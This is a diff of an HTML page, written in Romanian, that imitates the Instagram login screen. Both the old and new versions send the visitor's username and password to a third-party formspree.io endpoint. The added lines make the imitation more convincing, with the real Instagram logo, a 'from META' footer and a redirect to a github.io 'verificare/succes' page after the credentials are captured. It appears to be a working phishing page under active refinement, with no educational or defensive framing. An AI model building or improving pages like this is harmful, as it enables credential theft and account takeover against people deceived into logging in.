@@ -1,25 +1,34 @@
 <!DOCTYPE html>
-<html>
+<html lang="ro">
 <head>
     <meta charset="UTF-8">
-    <title>Instagram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
     <style>
-        body { background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; margin: 0; }
-        .box { background: white; padding: 40px; border-radius: 10px; text-align: center; width: 320px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
-        h1 { font-size: 35px; background: -webkit-linear-gradient(#833ab4, #fd1d1d, #fcb045); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dbdbdb; border-radius: 5px; box-sizing: border-box; background: #fafafa; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 14px; }
+        body { background: white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { width: 300px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 40px; }
+        input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 14px; box-sizing: border-box; outline: none; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 14px; }
+        .footer { position: absolute; bottom: 20px; font-size: 12px; color: #8e8e8e; text-transform: uppercase; letter-spacing: 1px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>Instagram</h1>
-        <form action="https://formspree.io/f/xdapgaep" method="POST">
-            <input type="text" name="utilizator" placeholder="Username, email sau telefon" required>
-            <input type="password" name="parola" placeholder="Parolă" required>
-            <input type="hidden" name="_next" value="https://instagram.com">
-            <button type="submit">Log In</button>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+        
+        <form action="https://formspree.io/f/xykbwwpg" method="POST">
+            <input type="text" name="Username" placeholder="Număr de telefon, utilizator sau e-mail" required>
+            <input type="password" name="Password" placeholder="Parolă" required>
+            
+            <button type="submit">Conectează-te</button>
+            
+            <input type="hidden" name="_next" value="https://ryt6ngx4tm-crypto.github.io/mata/verificare/succes.html">
         </form>
     </div>
+
+    <div class="footer">from META</div>
+
 </body>
 </html>
